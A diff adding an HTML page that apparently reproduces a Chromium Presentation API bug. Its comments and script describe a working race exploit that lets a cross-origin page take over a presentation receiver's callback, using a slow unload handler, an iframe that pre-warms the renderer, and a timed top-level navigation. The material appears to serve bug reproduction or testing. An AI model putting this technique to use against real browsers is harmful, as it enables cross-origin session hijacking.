@@ -1,0 +1,42 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+<title>Presentation receiver that navigates cross-origin</title>
+</head>
+<body>receiver
+<script>
+  // Note: Blink's ModulesInitializer eagerly creates a PresentationReceiver
+  // for every outermost document with settings.presentation_receiver=true, so
+  // this page already holds the LocalPresentation's receiver_callback_. The
+  // hijack works because the cross-origin page that commits next ALSO gets an
+  // eagerly-created PresentationReceiver, and LocalPresentation::
+  // RegisterReceiver (with DCHECKs off, as in production) silently overwrites
+  // receiver_callback_ to point at that page's renderer.
+
+  const target = decodeURIComponent(location.search.substring(1));
+  const targetOrigin = new URL(target).origin;
+
+  // Slow unload handler so the asynchronous ClosePage() ack triggered by
+  // PresentationReceiverWindowController::Terminate() is delayed past the
+  // cross-process commit of the hijack page.
+  addEventListener('unload', () => {
+    const t = Date.now();
+    while (Date.now() - t < 5000) {}
+  });
+
+  // Pre-warm the cross-origin renderer process via a subframe so the
+  // subsequent top-level navigation can reuse it and commit quickly (the
+  // close_timeout_ that will destroy this WebContents is only 500 ms).
+  // Subframe navigations are allowed by PresentationNavigationPolicy
+  // (it only blocks primary-main-frame navigations).
+  const f = document.createElement('iframe');
+  f.src = targetOrigin + '/target.html?warmup';
+  f.onload = () => {
+    // Second top-level navigation. AllowNavigation() returns false; the
+    // observer calls Terminate() but does NOT cancel the navigation.
+    location.href = target;
+  };
+  document.body.appendChild(f);
+</script>
+</body>
+</html>
